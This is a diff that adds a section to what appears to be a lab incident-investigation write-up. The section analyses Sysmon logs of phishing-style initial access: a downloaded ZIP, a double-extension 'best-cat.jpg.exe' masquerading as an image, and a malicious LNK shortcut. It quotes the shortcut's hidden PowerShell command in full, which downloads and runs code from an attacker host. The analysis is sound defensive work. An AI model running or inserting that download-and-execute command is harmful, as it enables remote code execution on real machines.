@@ -56,3 +56,67 @@ Concurrently, network-level authentication logs reveal ancillary lateral movemen
     <img src="img/logon-type3.png" alt="NTLM Logon Type 3" width="600"/>
   </a>
 </p>
+## 1. Initial Access and Defense Evasion Vectors (Continuation)
+
+### B. Phishing & Malicious Files (LNK, Double Extension and ZIP)
+
+Once inside the perimeter via RDP, the attacker shifts focus to expanding their foothold and introducing auxiliary tooling via social engineering and malicious file distribution. The adversary drops compressed archives and disguised binaries onto the victim's desktop environment.
+
+Tracing the telemetry back to the browser download event, we observe the initial file acquisition originating from an external web source via Microsoft Edge. The operating system immediately flags the file with a `Zone.Identifier`, marking it as originating from an untrusted Internet zone:
+
+* **Download and Zone Identification (Sysmon Event ID 11):**
+  * **Date/Time (UTC):** 2025-05-20 18:58:28.709
+  * **Process:** `msedge.exe` (PID: 1316)
+  * **TargetFilename:** `C:\Users\Administrator\Downloads\top-cats.zip:Zone.Identifier`
+
+<p align="center">
+  <a href="img/download-event.png" target="_blank">
+    <img src="img/download-event.png" alt="Sysmon Download Event ID 11" width="600"/>
+  </a>
+</p>
+
+Upon extracting the contents of the downloaded ZIP archive using Windows Explorer, the attacker deploys a file masquerading as a standard media asset. However, a closer look at the file path reveals a malicious double extension designed to trick unsuspecting users into executing a compiled binary:
+
+* **Hidden Executable Extraction (Sysmon Event ID 11):**
+  * **Date/Time (UTC):** 2025-05-20 18:58:43.834
+  * **Process:** `Explorer.EXE` (PID: 2788)
+  * **TargetFilename:** `C:\Users\Administrator\Pictures\best-cat.jpg.exe`
+
+<p align="center">
+  <a href="img/extraction-event.png" target="_blank">
+    <img src="img/extraction-event.png" alt="Sysmon File Extraction Event ID 11" width="600"/>
+  </a>
+</p>
+
+The process creation logs capture the exact moment this disguised file is launched. Spawning directly from the pictures directory, an 8MB executable runs under the guise of an image file, triggering suspicious child processes:
+
+* **Double Extension Malware Execution (Sysmon Event ID 1):**
+  * **Date/Time (UTC):** 2025-05-20 18:59:06.910
+  * **CommandLine:** `"C:\Users\Administrator\Pictures\best-cat.jpg.exe"` (PID: 5484)
+  * **Technique:** Masquerading (T1036)
+
+<p align="center">
+  <a href="img/process-create.png" target="_blank">
+    <img src="img/process-create.png" alt="Sysmon Process Create Event ID 1" width="600"/>
+  </a>
+</p>
+
+Inspecting the file properties confirms the deliberate spoofing of the icon and file type, proving how attackers exploit default Windows configurations where known file extensions are hidden from view:
+
+<p align="center">
+  <a href="img/Double-extension.png" target="_blank">
+    <img src="img/Double-extension.png" alt="Double Extension Malware Properties" width="600"/>
+  </a>
+</p>
+
+In parallel with binary execution, the adversary utilizes malicious shortcut links (`.LNK`) to achieve fileless persistence and command execution using native Living-off-the-Land Binaries (LOLBins). The shortcut executes an encoded PowerShell command stealthily in the background without raising any visible windows for the user:
+
+* **Malicious Shortcut (.LNK / LOLBins):**
+  * **File Name:** `Official Website.lnk`
+  * **Obfuscated Command:** `powershell.exe -WindowStyle hidden -c iex (iwr -UseBasicParsing "http://wp16.hqywlqpa.thm:8000/cgi-bin/f").Content`
+
+<p align="center">
+  <a href="img/lnk-shortcut.png" target="_blank">
+    <img src="img/lnk-shortcut.png" alt="Malicious LNK Properties" width="600"/>
+  </a>
+</p>
